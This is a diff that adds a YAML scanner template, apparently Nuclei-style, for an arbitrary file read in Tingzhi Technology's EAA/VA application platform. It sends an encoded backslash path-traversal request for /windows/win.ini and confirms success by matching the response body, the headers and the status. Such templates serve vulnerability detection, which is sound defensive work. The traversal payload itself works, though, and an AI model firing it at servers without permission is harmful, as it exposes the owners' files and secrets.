@@ -1,0 +1,31 @@
+id: eaa-app-lfi
+brief:
+    title: EAA Application Access System - Arbitary File Read
+    by: momika233
+    level: high
+    about: There is an arbitrary file reading vulnerability in the VA virtual application platform of Tingzhi Technology, through which an attacker can obtain sensitive information in the server.
+    label:
+        - eaa
+        - lfi
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/windows/win.ini'
+      signs:
+        - "on": word
+          has:
+            - bit app support
+            - fonts
+            - extensions
+          in: body
+          need: all
+        - "on": word
+          has:
+            - application/octet-stream
+            - filename=win.ini
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
